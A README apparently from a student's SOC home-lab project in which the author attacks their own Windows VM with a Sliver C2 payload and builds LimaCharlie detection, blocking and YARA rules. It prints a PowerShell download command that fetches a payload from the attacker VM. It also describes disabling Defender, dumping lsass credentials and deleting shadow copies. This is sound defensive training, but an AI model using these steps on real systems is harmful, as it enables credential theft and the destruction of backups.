<h1>SOC Analyst Home Lab</h1>


<h2>Description</h2>
Security Operations Center (SOC) analysts play a crucial role in maintaining the security posture of organizations by monitoring, analyzing, and responding to security incidents. While looking for projects to gain hands on experience outside of my academic labs I heard about this project from Eric Capuano (Recon InfoSec) via Gerald Auger (SimplyCyber) . Eric's substack blog "So you want to be a SOC Analyst" was a great resource; explaining the scope, process and execution of creating a home SOC lab where I accomplished the following :
<br/><br/>
- Configured VMware with Windows and Ubuntu VMs<br/>
- Managed Windows VM: disabled Defender, prevented standby, installed Sysmon, and deployed LimaCharlie EDR<br/>
- Set up Sliver C2 server on Ubuntu VM, executed payload on Windows, and analyzed EDR telemetry<br/>
- Developed & implemented blocking rule in LimaCharlie, proficient in crafting detection rules, and used baselining to reduce false positives<br/>
- Automated YARA scanning in LimaCharlie, developed rules for scanning files and processes, and created D&R rules for new .exe files in Downloads<br/>

<br />


<h2>Environments and Utilities Used</h2>

- <b>VMWare WorkStation 16 Pro</b>
- <b>Windows 11 DevEval</b>
- <b>Ubuntu Server 22.04.1</b>
- <b>LimaCharlie EDR</b>
- <b>Sliver Command & Control (C2) Server</b>
- <b>PowerShell</b> 
- <b>Windows Command Prompt & Linux Terminal</b>


<h2>Project walk-through:</h2>

<p align="center">
To start things off I already had VMWare Workstation and just had to acquire ISO's for Windows 11 DevEval and Ubuntu Server from their respective websites. <br />
<br />
Setting up the Ubuntu Server was quick and easy, just had to get the virtual network's SubNet IP and Gateway IP to setup manual ipv4 instead of dhcp, note our static ip for remote SSH conenction, and install OpenSSH server.<br />
<br />
When setting up the Windows VM you may think you can just disable Defender in settings and you would be wrong. To accomplish this you must also turn off microsoft defender antivirus in the Local Group Policy Editor, reboot in safe-mode to make some changes to the registry to disable AntiSpyware and disable a few services in regedit (Sense, WdBoot, WinDefend, WdNisDrv, WdNisSvc, and WdFilter). Next task was to prevent the VM from going into standby done by administrative command prompt to change the powercfg. Using an Administrative PowerShell I downloaded and installed Sysmon with SwiftOnSecurit's Sysmon config.<br />
<br />
Installing LimaCharlie EDR required making and account on their site and creating an organization. 
<br />
<br /> 
Creating the Sensor for Windows VM: <br/>
<img src="https://i.imgur.com/DmC3QXn.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Installing the Sensor via PowerShell using code given by LimaCharlie:  <br/>
<img src="https://imgur.com/hRMlOL9.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Configured rule for the new sensor to send SysMon event logs with it's EDR telemtry: <br/>
<img src="https://imgur.com/6hrkryg.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Remote SSH connection to Ubuntu Server from Windows VM to Install, Setup, and Control Sliver C2 Server: <br/>
<img src="https://imgur.com/xg37JJg.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Generated C2 Session Payload using Linux VM's static IP on Sliver. <br />
To get the payload onto the Windows VM I setup and downloaded from a temporary web server using commands in PowerShell: <br />
python3 -m http.server 80 <br />
IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
<br />
Started Sliver Command and Control Session via SSH connection ie HTTP listener
<br />
Executed the C2 Payload on the Windows VM. Verified it's Session ID on Sliver and interacted with the session. Ran commands including info, whoami, getprivs, pwd, netstat, and ps -T.
<br />
<br />
Back in LimaCharlie I observed the EDR Telemtry gathered from the above actions (payload was named TINY_SENSE):  <br/>
<img src="https://imgur.com/JjSzLA2.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Checked hash of payload's exe and scanned it with VirusTotal. Item not found because our attacker C2 generated it on the spot:  <br/>
<img src="https://imgur.com/Xl3GNLr.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Using Sliver I went after credentials and dumped the lsass.exe process from memory and saved it to my Sliver C2 server. <br/>
 <br />
 LimaCharlie generated a sensitive process access event for lsass.exe dump as it is a common attack vector:  <br/>
<img src="https://imgur.com/nQBNoIC.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
 Created a custom D&R rule in LimaCharlie to generate a detection report:  <br/>
<img src="https://imgur.com/Gh9yYPQ.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
 Ran the lsass.exe dump again from Sliver to see if LimaCharlie detected it and was successful:  <br/>
<img src="https://imgur.com/t3ApQnE.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
 Next attack was vssadmin delete shadows /all and this was also detected by LimaCharlie with reference containing a YARA signature:  <br/>
<img src="https://imgur.com/0wZEx5d.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Created new D&R rule that not only reports but blocks the attack:  <br/>
<img src="https://imgur.com/eHLF7EC.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Created a YARA signature for the Sliver C2 Payload:  <br/>
<img src="https://imgur.com/LndMssj.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Used LimaCharlie EDR Sensor Console to run manual YARA scan of the Sliver Payload Exe:  <br/>
<img src="https://imgur.com/m39cVjD.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Created new rules to automatically scan downloaded EXEs and processes launched from Downloads directory:  <br/>
<img src="https://imgur.com/sdDwFsJ.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Tested new automatic yara scan rules by relaunching Sliver C2 Payload "TINY_SENSE.EXE":  <br/>
<img src="https://imgur.com/Lx1Feuk.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
This Project was a lot of fun and I learned a lot that expanded on my previous knowledge of Packet Capture and Analysis with nmap and wireshark. In my excitement running Sliver and playing both sides of attacker and attackee I forgot a few screenshots of it's use. Thank you to Eric Capuano for creating one of the best Lab Projects I have done yet.
</p>

<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
